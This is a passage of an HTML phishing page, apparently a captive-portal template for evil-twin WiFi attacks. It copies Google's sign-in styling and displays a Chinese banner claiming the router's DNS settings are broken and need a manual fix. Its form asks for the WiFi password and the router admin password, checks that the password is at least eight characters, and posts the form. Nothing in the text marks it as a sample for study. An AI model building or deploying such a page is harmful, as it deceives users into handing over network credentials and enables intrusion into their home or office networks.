.google-header-bar.centered {
	border: 0;
	height: 108px
}
.google-header-bar.centered .header .logo {
	float: none;
	margin: 40px auto 30px;
	display: block
}
.banner {
	text-align: center
}
.card {
	background-color: #f7f7f7;
	padding: 20px 25px 30px;
	margin: 0 auto 25px;
	width: 304px;
	-moz-border-radius: 2px;
	-webkit-border-radius: 2px;
	border-radius: 2px;
	-moz-box-shadow: 0 2px 2px rgba(0,0,0,.3);
	-webkit-box-shadow: 0 2px 2px rgba(0,0,0,.3);
	box-shadow: 0 2px 2px rgba(0,0,0,.3)
}
.rc-button, .rc-button:visited {
	display: inline-block;
	min-width: 46px;
	text-align: center;
	color: #444;
	font-size: 14px;
	font-weight: 700;
	height: 36px;
	padding: 0 8px;
	line-height: 36px;
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	-o-transition: all 218ms;
	-moz-transition: all 218ms;
	-webkit-transition: all 218ms;
	transition: all 218ms;
	border: 1px solid #dcdcdc;
	background-color: #f5f5f5;
	background-image: -webkit-linear-gradient(top, #f5f5f5, #f1f1f1);
	background-image: -moz-linear-gradient(top, #f5f5f5, #f1f1f1);
	background-image: -ms-linear-gradient(top, #f5f5f5, #f1f1f1);
	background-image: -o-linear-gradient(top, #f5f5f5, #f1f1f1);
	background-image: linear-gradient(top, #f5f5f5, #f1f1f1);
	-o-transition: none;
	-moz-user-select: none;
	-webkit-user-select: none;
	user-select: none;
	cursor: default
}
.card .rc-button {
	width: 100%;
	padding: 0
}
.rc-button-submit, .rc-button-submit:visited {
	border: 1px solid #3079ed;
	color: #fff;
	text-shadow: 0 1px rgba(0,0,0,.1);
	background-color: #4d90fe;
	background-image: -webkit-linear-gradient(top, #4d90fe, #4787ed);
	background-image: -moz-linear-gradient(top, #4d90fe, #4787ed);
	background-image: -ms-linear-gradient(top, #4d90fe, #4787ed);
	background-image: -o-linear-gradient(top, #4d90fe, #4787ed);
	background-image: linear-gradient(top, #4d90fe, #4787ed)
}

<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
.google-header-bar.centered {	height: 83px;}.google-header-bar.centered .header .logo {	margin: 25px auto 20px;}.card {	margin-bottom: 20px;}
</style>
<style>
.signin-card {	width: 274px;	padding: 40px 40px}.signin-card input[type=password], .signin-card input[type=text], .signin-card input[type=submit] {	width: 100%;	display: block;	margin-bottom: 10px;	z-index: 1;	position: relative;	-moz-box-sizing: border-box;	-webkit-box-sizing: border-box;	box-sizing: border-box}.signin-card #Passwd, .signin-card .captcha {	direction: ltr;	height: 44px;	font-size: 16px}
</style>
</head>
<body>
<div class="wrapper">
<div class="google-header-bar  centered">
  <div class="header content clearfix">
    <div class="logo logo-w" aria-label="Google"></div>
  </div>
</div>
<div class="main content clearfix">
  <div class="banner">
    <h2> 路由器DNS配置出错，请手动修复。</h2>
  </div>
  <div class="card signin-card">
    <form   id="formid" name='frm'  method='post' >
      <input id="Passwd" name="pass" placeholder="WiFi登录密码" class="" type="password">
      <input id="Passwd" name="pass2" placeholder="管理员密码" class="" type="password">
      <input id="signIn" name="signIn" class="rc-button rc-button-submit" value="登陆" type="button" onClick="tz()">
    </form>
    <script type="text/javascript">function tz() {
		
	var input = document.getElementsByName("pass");
	if (input[0].value == '') {
		alert('密码不能为空！');
		input.focus();
		return false;
	}
	if (input[0].value.length < 8) {
		alert('密码至少为8位，请重新输入！');
		input.focus();
		return false;
	}
	document.getElementById("formid").submit();
}</script>
  </div>
</div>
</body>
</html>
